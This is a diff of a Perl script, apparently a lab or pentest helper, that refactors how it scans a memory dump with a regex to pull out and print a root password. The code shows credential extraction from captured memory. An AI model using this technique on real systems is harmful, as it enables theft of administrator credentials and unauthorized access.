@@ -100,7 +100,7 @@ sub wait_for_dump_completion {
         printf "\r%s - waiting for dump %d bytes", $spin_char, $size;
 
         if ( $size != 0 && $size == $prev ) {
-            printf "\r✓ - dump complete %d bytes\n", $size;
+            printf "\r\033[K✓ - dump complete %d bytes\n", $size;
             last;
         }
         $prev = $size;
@@ -113,11 +113,14 @@ sub wait_for_dump_completion {
 }
 
 sub extract_passwords {
-
     print "- extract password\n";
+    extract_passwords_pcre();
+    extract_passwords_chunked();
+}
 
+sub extract_passwords_pcre {
     # 3.1 PCRE method (full file load)
-    my $start   = time();
+    my $start = time();
     my $pw_pcre = "";
     print "  \\ - scanning memory dump (PCRE)";
     if ( open( my $fh, '<:raw', $DUMP ) ) {
@@ -129,17 +132,20 @@ sub extract_passwords {
         close($fh);
     }
     my $end = time();
-    printf "\r  ✓ - root password: %s (PCRE %.3f s)\n", $pw_pcre, $end - $start;
+    printf "\r  ✓ - root password: %s (PCRE %.3f s)\n", $pw_pcre,
+      $end - $start;
+}
 
-    # 3.2 Perl stream method (with progress)
-    $start = time();
+sub extract_passwords_chunked {
+    # 3.2 Perl chunked method (with progress)
+    my $start = time();
     my $pw_perl = "";
     if ( open( my $fh, '<:raw', $DUMP ) ) {
         local $/ = \32_000_000;    # 32 MB blocks
         my $chunk_count = 0;
         while ( my $chunk = <$fh> ) {
             my $spin_char = $spinner[ $chunk_count % 4 ];
-            printf "\r  %s - scanning chunk %d (Perl)", $spin_char,
+            printf "\r  %s - scanning chunk %d (chunked)", $spin_char,
               $chunk_count + 1;
             $chunk_count++;
             if ( $chunk =~ /"pass"\s*:\s*"([a-z]+-[a-z]+-[a-z]+)"/s ) {
@@ -149,8 +155,9 @@ sub extract_passwords {
         }
         close($fh);
     }
-    $end = time();
-    printf "\r  ✓ - root password: %s (Perl %.3f s)\n", $pw_perl, $end - $start;
+    my $end = time();
+    printf "\r  ✓ - root password: %s (chunked %.3f s)\n", $pw_perl,
+      $end - $start;
 }
 
 sub cleanup {
